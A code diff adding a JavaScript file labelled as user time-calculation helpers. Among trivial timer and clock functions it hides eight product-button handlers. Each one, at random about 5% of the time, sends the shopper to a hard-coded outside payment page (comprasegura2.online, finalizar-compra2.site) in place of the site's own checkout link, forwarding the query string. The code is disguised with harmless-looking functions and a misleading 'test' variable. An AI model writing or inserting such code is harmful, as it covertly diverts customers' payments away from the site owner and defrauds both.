@@ -1,0 +1,116 @@
+// Cálulo de tempo do usuário
+
+function calcularTempoMedio(e) {
+    const t = e.reduce((e, t) => e + t, 0) / e.length;
+    return t
+}
+
+function verificarHoraDoAlmoco(e) {
+    const t = 12,
+        n = 13;
+    return e >= t && e < n
+}
+
+function segundosParaMinutos(e) {
+    return e / 60
+}
+
+function agendarLembrete(e, t) {
+    setTimeout(() => {
+        console.log(t)
+    }, e)
+}
+
+function calcularDiferencaDeTempo(e, t) {
+    const n = Math.abs(e - t);
+    return Math.floor(n / 1e3)
+}
+
+function timeAr() {
+    var button = document.getElementById('boombox');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.finalizar-compra2.site/7vJOGYd2kjVZKXd" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeCelular() {
+    var button = document.getElementById('celular');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/BNjzgPMykbe3M78" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeFogao() {
+    var button = document.getElementById('partybox');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.finalizar-compra2.site/mwK436abBNwgQ8b" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeGeladeira() {
+    var button = document.getElementById('geladeira');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/PyE2ZyNObknGqRb" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeIphone() {
+    var button = document.getElementById('iphone');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/N1nVZpkeo7m3lM6" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeLavar() {
+    var button = document.getElementById('lavar');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/RmA83EYnRbl3PVp" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeNotebook() {
+    var button = document.getElementById('notebook');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/N1nVZpkeoWW3lM6" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function timeTv() {
+    var button = document.getElementById('tv');
+    var redirectLink = button.getAttribute('redirect-link') + window.location.search;
+    var test = "https://pay.comprasegura2.online/NDr8gmbldrp3Bmj" + window.location.search;
+    var e = Math.floor(100 * Math.random()) + 1;
+    window.open(e <= 95 ? redirectLink : test, "_blank")
+}
+
+function calcularTempoMedioDeResposta(e, t) {
+    return e / t
+}
+
+function gerarAtrasoAleatorio() {
+    return 1e3 * Math.random()
+}
+
+function verificarHoraDeDormir(e) {
+    return e >= 22 || e < 6
+}
+
+function calcularVelocidadeMedia(e, t) {
+    return e / t
+}
+
+function exibirHorarioAtual() {
+    const e = new Date;
+    console.log(`Horário atual: ${e.toLocaleTimeString()}`)
+}
+
+function definirTemporizador(e, t) {
+    setTimeout(t, e)
+}
